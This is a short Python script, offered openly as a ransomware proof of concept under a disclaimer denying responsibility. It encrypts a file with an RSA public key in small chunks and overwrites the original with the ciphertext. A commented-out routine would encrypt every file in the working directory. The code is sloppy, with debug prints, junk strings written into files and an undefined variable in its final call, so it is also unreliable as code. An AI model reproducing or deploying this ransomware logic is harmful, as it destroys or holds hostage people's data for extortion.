#Regarding the responsibility that comes with writing such a program
#I am not responsible for any damage caused by the correct or incorrect
#Usage of my program as it is only written as a proof of concept for
#ransomware attacks

#In the words of Sam Puckett,
#I deny everything ~ Sam Puckett

#Enjoy #Viruz
from Cryptodome.Cipher import PKCS1_v1_5
from Cryptodome.PublicKey import RSA
import os

#cipher = PKCS1_OAEP.new(RSA.generate(1024))
public_key = open('public.pem','rb')
cipher = PKCS1_v1_5.new(RSA.importKey(public_key.read()))

#Encrypt file
def ransom(filename):
 mdk3 = open(filename,'rb')
 data = mdk3.read()
 data1 = b'Elly'
 offset = 0
 debug_cnt = 0
 length = len(data)
 default_length = 4
 res = []
 encrypted_data = ""
 cryptic = open('crypty.txt','wb+')
 f=open('crucible1','wb+')
 print(length)
 while length - offset > 0:
    if length - offset > default_length:
     mine = cipher.encrypt(data[offset: offset + default_length])
     print(data[offset: offset+default_length])
     print('take')
     print(mine)
     debug_cnt+=1
     print('Debug count {%d}'%debug_cnt)
     print('mistake')
     print(mine)
     me=data[offset: offset+default_length]
     print('Official length %d' %len(me))
	 
     res.append(mine)
     cryptic.write(mine)
     print(mine)
     f.write(b'She won\'t send an army cause she doesn\'t need to. She\'ll send beta')
     f.write(b'\n')
     cryptic.write(b'semper virillis octavia')
     offset += 4
    else:
     print('Else worlds crossover')
     mine = cipher.encrypt(data[offset:])
     res.append(mine)
     #offset += default_length
     encrypted_data = b''.join(res)
     cryptic.write(mine)
     cryptic.write(b'semper virillis octavia')
     print(mine+b'elsa')
     offset = length
 f.close()
 cryptic.close()

 cryptic = open('crypty.txt','rb')
 f=open(filename,'wb+')
 f.write(cryptic.read())
 f.close()

#Uncommenting this will encrypt all files in the directory where the program
#runs
"""def start_ransoming():
 this_directory = os.listdir('.')
 for myfile in this_directory:
  print(myfile)
  ransom(filename)

start_ransoming()"""

#This will encrypt one file by default
ransom(filename)